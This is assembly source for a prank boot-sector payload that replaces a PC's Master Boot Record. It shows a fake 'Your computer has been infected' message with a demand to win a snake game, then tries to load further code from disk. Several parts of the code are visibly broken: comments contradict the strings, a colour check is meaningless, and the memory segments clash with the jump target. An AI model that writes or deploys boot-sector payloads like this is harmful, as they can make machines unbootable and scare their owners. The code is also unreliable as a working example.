 ; -------- ENVIRONMENT -------- ;
    ; defines 16-bit environment
    [bits 16]
    ; MBR is always loaded at offset 0x07C00
    ; make life easier by using relative references
    [org 0x7C00]

    mov ah, 07h
    int 10h

; -------- MAIN -------- ;
main:
    ; disable the blinky cursor
    mov ah, 0x01
    mov cx, 0x2000
    int 0x10

    ; control cursor shape
    mov dx, 0x3D4
    mov al, 0x0A
    out dx, al
    inc dx
    mov al, 0x20
    out dx, al

    ; disable the cursor
    mov dx, 0x3D4
    mov al, 0x0A
    out dx, al
    inc dx
    mov al, 0x1F
    out dx, al

    ; initialize color display
    mov ax, cs
    mov ds, ax
    mov dx, 0
    mov bh, 0
    mov ah, 0x2
    int 0x10

    ; set background color to black and foreground color to white
    mov cx, 2000
    mov bh, 0
    mov bl, 0x0F
    mov al, 0x20
    mov ah, 0x9
    int 0x10

    ; print "Checkmate.", 10
    mov dx, 1975 ; sets text coordinates
    mov bh, 0
    mov ah, 0x2
    int 0x10
    mov si, message
    call printString

    ; print "To fix it, win this game of snake.", 10
    mov dx, 2406 ; sets text coordinates
    mov bh, 0
    mov ah, 0x2
    int 0x10
    mov si, message2
    call printString

    ; print "Press ",0x7D," to continue.", 0
    mov dx, 3005 ; sets text coordinates
    mov bh, 0
    mov ah, 0x2
    int 0x10
    mov si, message3
    ; Set text color to green
    cmp si, 0x7D
	je green

    call printString

	call wait_for_p_key

    jmp $

; -------- FUNCTIONS -------- ;

printString:
    ; Does what the name says. Prints the text
    pusha
    cld

nextChar:
    mov al, [si]
    cmp al, 0
    je endPrintString
    mov ah, 0x0E
    int 0x10
    inc si
    jmp nextChar

endPrintString:
    popa
    ret

green:
	mov ah, 09h
	mov al, [si]
	mov bl, 0x0A
	int 0x10
	ret

wait_for_p_key:
	mov ah, 00h
	int 16h
	cmp al, 'p'
	je load_snake
	cmp al, 'P'
	je load_snake
	cmp al, 'p'
	jne wait_for_p_key
	ret

load_snake:
	mov ax, 0x07C0
	mov ds, ax
	mov es, ax

	mov bx, 0x1000
	mov ah, 0x02
	mov al, 2
	mov ch, 0
	mov cl, 2
	mov dh, 0
	mov dl, 0

	int 0x13

	jc read_error

	jmp 0x1000:0000

read_error:
	jmp hang

hang:
	jmp hang


; -------- VARIABLES -------- ;
message db "Your computer has been infected", 0
message2 db "To fix it, win this game of snake.", 0
message3 db "Press P to continue.", 0

; -------- BOOT CONFIGURATION -------- ;
    ; fill the remaining bytes of the MBR with 0s
    times 510 - ($ - $$) db 0
    ; add the 'magic bytes' AA and 55 to the end of MBR
    ; this tells the BIOS this is a valid bootloader
    dw 0xAA55

